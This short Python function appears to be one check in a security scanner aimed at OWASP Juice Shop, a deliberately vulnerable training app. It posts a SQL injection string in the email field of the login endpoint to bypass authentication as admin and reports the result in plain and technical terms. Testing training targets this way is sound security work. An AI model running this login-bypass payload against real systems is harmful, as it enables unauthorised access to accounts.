import requests
def run_web01(target):
    payload = {
        "email": "admin@juice-sh.op'--",
        "password": "anything"
    }
    response = requests.post(f"{target}/rest/user/login", json=payload)

    if response.status_code == 200:
        return {
            "id": "WEB-01",
            "vulnerable": True,
            "plain_english": "An attacker could log in as admin without knowing the real password.",
            "technical": "SQL injection in the login email field bypassed authentication — a crafted string broke out of the intended SQL query and returned HTTP 200."
        }
    else:
        return {
            "id": "WEB-01",
            "vulnerable": False,
            "plain_english": "Login could not be bypassed this way.",
            "technical": "SQLi payload did not return HTTP 200; authentication bypass not confirmed."
        }
